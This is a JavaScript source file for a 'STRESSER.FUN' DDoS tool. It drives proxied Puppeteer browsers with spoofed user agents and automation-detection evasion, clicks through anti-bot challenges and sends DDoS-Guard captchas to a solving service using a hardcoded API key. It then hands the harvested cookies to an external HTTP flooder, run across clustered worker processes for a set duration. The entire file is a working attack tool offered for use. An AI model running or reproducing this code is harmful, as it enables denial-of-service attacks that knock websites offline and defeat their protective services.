import puppeteer from 'puppeteer';
import { spawn } from 'child_process';
import fs from 'fs';
import axios from 'axios';
import cluster from 'cluster';
import os from 'os';

const [target,time,threads,requests,proxyfile,mode,postdata] = process.argv.slice(2);
const proxies = fs.readFileSync(proxyfile, "utf-8").toString().replace(/\r/g, "").split("\n").filter((word) => word.trim().length > 0);

process.on("uncaughtException", function (error)  {});
process.on("unhandledRejection", function (error) {});
process.setMaxListeners(0);

var starts;
let browser;
let blankPage;

const getRandomUserAgent = (browser) => {
	const platform = 'Linux';

	const version = platform === 'Windows'
        ? `Windows NT ${[6.1, 6.2, 6.3, 10.0][Math.floor(Math.random() * 4)]}; ${['Win64; x64', 'WOW64'][Math.floor(Math.random() * 2)]}`
        : `X11; Linux ${['x86_64', 'i686'][Math.floor(Math.random() * 2)]}`;


	if (browser === 'Chrome') {
		const chromeVersion = Math.floor(Math.random() * 31) + 85;
		return {
			userAgent: `Mozilla/5.0 (${version}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion}.0.0.0 Safari/537.36`,
			browserVersion: `${chromeVersion}`,
			browser: `Google Chrome`,
		};
	}

	if (browser === 'Edge') {
		const edgeVersion = Math.floor(Math.random() * 31) + 85;
		return {
			userAgent: `Mozilla/5.0 (${version}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${edgeVersion}.0.0.0 Safari/537.36 Edg/${edgeVersion}`,
			browserVersion: `${edgeVersion}`,
			browser: `Microsoft Edge`,
		};
	}		
};

const userAgent = getRandomUserAgent(Math.random() < 0.5 ? 'Chrome' : 'Edge');

async function main(proxy) {
	try {
		browser = await puppeteer.launch({
			headless: false,
			args: [
				'--incognito',
				'--start-maximized',
				'--disable-blink-features=AutomationControlled',
				'--disable-features=IsolateOrigins,site-per-process',
				'--use-fake-device-for-media-stream',
				'--use-fake-ui-for-media-stream',
				'--no-sandbox',
				'--disable-dev-shm-usage',
				'--disable-software-rasterizer',
				'--enable-features=NetworkService',
				'--proxy-server=' + proxy,
				'--user-agent=' + userAgent.userAgent,					
				'--auto-open-devtools-for-tabs',
				
			],
			ignoreDefaultArgs: ['--enable-automation'],
			defaultViewport: null,
		});
		const pages = await browser.pages();
		blankPage = pages[0];

		if (!browser) {
			console.error('Browser is not initialized. Call initBrowser() first.');
			return;
		}

		  await blankPage.goto('about:blank');
		  
		  await blankPage.goto(target);

		  await blankPage.evaluate((target) => {
			window.open(target, '_blank'); 
		  }, target);


		await new Promise(resolve => setTimeout(resolve, 5000)); 
		
		const page = await browser.pages();
		const newPage = page.length > 1 ? page[page.length - 1] : null;	
			
		console.log('[STRESSER.FUN] goto done');
		await newPage.waitForTimeout(10000);
		
		if (newPage) {
			await newPage.waitForTimeout(3000);
			const iframeElement = await detectIframe(newPage);

			if (iframeElement) {
				await clickIframe(newPage, iframeElement);
				await newPage.waitForTimeout(10000);
			}
		} else {
			console.error('New page not found');
		}		
		
		const checked_title = await newPage.title();
		if (["Just a moment...", "Checking your browser...", "Access denied", "DDOS-GUARD",].includes(checked_title)) {
			await newPage.close();
			await context.close();
			await browser.close();
			await blankPage.close();
		}			
		
		const cookie = await newPage.cookies();
		const cookieString = cookie.map((c) => `${c.name}=${c.value}`).join("; ");
		
		if(cookieString != '') { 
			console.log("[STRESSER.FUN] " + cookieString);
		} else {
			console.log("[STRESSER.FUN] Cookie: False");
		}
		
		flooder(cookieString, proxy, userAgent);
		
		await newPage.close();
		await context.close();
		await browser.close();
		await blankPage.close();		
		
		browser.kill();
		context.kill();
		blankPage.kill();
		newPage.kill();		
	} finally {
		newPage.close();
		context.close();
		browser.close();
		blankPage.close();
		browser.kill();
		context.kill();
		blankPage.kill();
		newPage.kill();
	}
}

async function detectIframe(page) {
    const iframeElement = await page.$('iframe[allow="cross-origin-isolated; fullscreen"]');
    if (iframeElement) {
        console.log('Managed challenge | Legacy captcha detected');
        return iframeElement;
    }
    return null;
}

async function clickIframe(page, iframeElement) {
    if (!iframeElement) {
        console.log('Element not found');
        return;
    }

    const iframeBox = await iframeElement.boundingBox();

    if (!iframeBox) {
        console.log('Box not found');
        return;
    }

    const x = iframeBox.x + (iframeBox.width / 2);
    const y = iframeBox.y + (iframeBox.height / 2);
	
	console.log('coord: x: ' + x + " y: " + y)

    console.log('Element clicked');

    await page.mouse.move(504, 256);
    await page.waitForTimeout(300);
    await page.mouse.down();
    await page.waitForTimeout(300);
    await page.mouse.up();

    console.log('Captcha bypassed [Box, Element]');
}

async function ddgCaptcha(page) {
    let s = false;

    for (let j = 0; j < page.frames().length; j++) {
        const frame = page.frames()[j];
        const captchaStatt = await frame.evaluate(() => {
            if (
                document.querySelector("#ddg-challenge") &&
                document.querySelector("#ddg-challenge").getBoundingClientRect()
                    .height > 0
            ) {
                return true;
            }

            const captchaStatus = document.querySelector(".ddg-captcha__status");
            if (captchaStatus) {
                captchaStatus.click();
                return true;
            } else {
                return false;
            }
        });

        if (captchaStatt) {
            await page.waitForTimeout(3000);

            const base64r = await frame.evaluate(async () => {
                const captchaImage = document.querySelector(
                    ".ddg-modal__captcha-image"
                );
                const getBase64StringFromDataURL = (dataURL) =>
                    dataURL.replace("data:", "").replace(/^.+,/, "");

                const width = captchaImage?.clientWidth;
                const height = captchaImage?.clientHeight;

                const canvas = document.createElement("canvas");
                canvas.width = width;
                canvas.height = height;

                canvas.getContext("2d").drawImage(captchaImage, 0, 0);
                const dataURL = canvas.toDataURL("image/jpeg", 0.5);
                const base64 = getBase64StringFromDataURL(dataURL);

                return base64;
            });

            if (base64r) {
                try {
                    console.log("[STRESSER.FUN] DDoS-Guard Captcha Detected.");
                    const response = await axios.post(
                        "https://api.nopecha.com/",
                        {
                            key: "n1j7su7msk_N8N2RG9A",
                            type: "textcaptcha",
                            image_urls: [base64r],
                        },
                        {
                            headers: {
                                "Content-Type": "application/json",
                            },
                        }
                    );

                    const res = response.data;

                    const text = await new Promise((resCaptcha) => {
                        function get() {
                            axios.get("https://api.nopecha.com/", {
                                    params: {
                                        id: res.data,
                                        key: "n1j7su7msk_N8N2RG9A",
                                    },
                                })
                                .then((res) => {
                                    if (res.data.error) {
                                        setTimeout(get, 1000);
                                    } else {
                                        resCaptcha(res.data.data[0]);
                                    }
                                })
                                .catch((error) => { });
                        }
                        get();
                    });

                    s = text;

                    await frame.evaluate((text) => {
                        const captchaInput = document.querySelector(".ddg-modal__input");
                        const captchaSubmit = document.querySelector(".ddg-modal__submit");

                        captchaInput.value = text;
                        captchaSubmit.click();
                    }, text);
                    await page.waitForTimeout(6500);
                    console.log("[STRESSER.FUN] DDoS-Guard Captcha bypassed.");
                } catch (err) { }
            }
        }
    }
    return !!!s;
}

function flooder(cookieString, proxy, userAgent) {
	try { 
		/*const args_flood_new = [
			"syeta.js", target, time, requests, proxy, mode, postdata, "-h", `cookie@${cookieString}`, "-h", `user-agent@${userAgent.userAgent}`
		];*/
		
		/*const args_flood_new = [
			target, time, requests, proxy, cookieString, userAgent.userAgent
		];*/
		
		/*const args_flood_new = [
			"flooder.py", "-u", target, "-l", requests, "-p", proxy, "-t 5", "-c", `cookie@${cookieString}`, "-ua", `user-agent@${userAgent.userAgent}`, "-d 0"
		];*/	

		const args_flood_new = [
			"syeta.js", "-u", target, "-d", time, "-r", requests, "-p", proxy, "-m", mode, "-k", postdata, "-c", `${cookieString}`, "-h", `${userAgent.userAgent}`
		];		
		
		console.log('[STRESSER.FUN] IP IS CONNECTED: ' + proxy);
		
		starts = spawn("node", args_flood_new, {
			stdio: "inherit",
			detached: false,
		});
		
		starts.on("data", (data) => { });
		starts.on("exit", (err, signal) => {
			starts.kill();
		});			
	} catch(err) {
		console.log(err)
	}
}

function start() {
	const proxy = proxies[Math.floor(Math.random() * proxies.length)];
	main(proxy).catch(() => { }).finally(start);
}

if (cluster.isMaster) {
    Array.from({length: threads}, (_, i) => cluster.fork({core: i % os.cpus().length}));

    cluster.on('exit', (worker) => {
        console.log(`Worker ${worker.process.pid} died. Restarting...`);
        cluster.fork({core: worker.id % os.cpus().length});
    });

    setTimeout(() => process.exit(console.log('Primary process exiting...')), time * 1000);

} else {
    start();
    setTimeout(() => process.exit(console.log(`Worker ${process.pid} exiting...`)), time * 1000);
}
